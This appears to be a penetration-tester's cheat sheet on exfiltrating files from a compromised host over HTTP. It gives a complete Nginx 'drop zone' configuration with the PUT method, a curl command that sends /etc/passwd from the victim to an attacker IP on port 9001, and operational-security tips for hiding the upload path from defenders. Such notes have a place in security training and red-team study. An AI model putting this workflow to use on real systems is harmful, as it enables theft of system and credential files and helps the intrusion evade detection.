
### [!ABSTRACT] **HTTP/HTTPS Web Transfers (Nginx PUT Method)**

HTTP/HTTPS is the most reliable exfiltration method because web traffic is rarely blocked by egress firewalls. Using Nginx with the `PUT` method allows for encrypted, stable, and stealthy file uploads that look like legitimate web traffic to network monitors.

---

### [!INFO] **Nginx Server Configuration**

Configure your attack machine (Arch Linux) to act as a secure "Drop Zone." Nginx is preferred over Apache because it does not allow directory listing by default, keeping your exfiltrated data hidden.

> [!Note] **Attacker (Setup Drop Zone)**
> 
> Bash
> 
> ```
> # 1. Create the secret upload directory
> sudo mkdir -p /var/www/uploads/SecretUploadDirectory
> sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
> 
> # 2. Create the configuration file
> # Save this as: /etc/nginx/sites-available/upload.conf
> 
> # --- START CONFIG ---
> server {
>     listen 9001;
>     location /SecretUploadDirectory/ {
>         root    /var/www/uploads;
>         dav_methods PUT;
>     }
> }
> # --- END CONFIG ---
> 
> # 3. Enable the config and resolve port conflicts
> sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
> sudo rm /etc/nginx/sites-enabled/default
> 
> # 4. Start the service
> sudo systemctl restart nginx.service
> ```

---

### [!TIP] **Executing the Upload**

Once the server is live on port 9001, use `curl` from the compromised machine to send the data.

> [!ATTENTION] **Receiver / Victim (Sending File)**
> 
> Bash
> 
> ```
> # Upload a file (e.g., /etc/passwd) to your Nginx server
> curl -T /etc/passwd http://<YOUR_IP>:9001/SecretUploadDirectory/users.txt
> ```

---
>[!SUCCESS] **Verification & Data Retrieval**

> [!CHECK] **Attacker (Checking Results)**
> 
> Bash
> 
> ```
> # Verify the file exists in your local directory
> ls -l /var/www/uploads/SecretUploadDirectory/
> 
> # Read the content
> tail -n 1 /var/www/uploads/SecretUploadDirectory/users.txt
> ```

---

> [!CAUTION] **Operational Security (OpSec)**

- **Conflict Resolution:** If Nginx fails to start, check for processes blocking the port: `ss -lnpt | grep 80`.
    
- **Path Obfuscation:** Always use a non-obvious name for `SecretUploadDirectory` to prevent accidental discovery by blue teams or automated crawlers.
    
- **No Execution:** Ensure your upload directory is not configured to execute scripts (like PHP), which prevents "Reverse Compromise" where a target hacks back into your machine.
    

---

>[!TLDR] **Quick Reference**

- **Tool:** Nginx
    
- **Method:** HTTP PUT
    
- **Port:** 9001 (or any custom high port)
    
- **Client Command:** `curl -T <file> http://<ip>:<port>/<path>/`
    

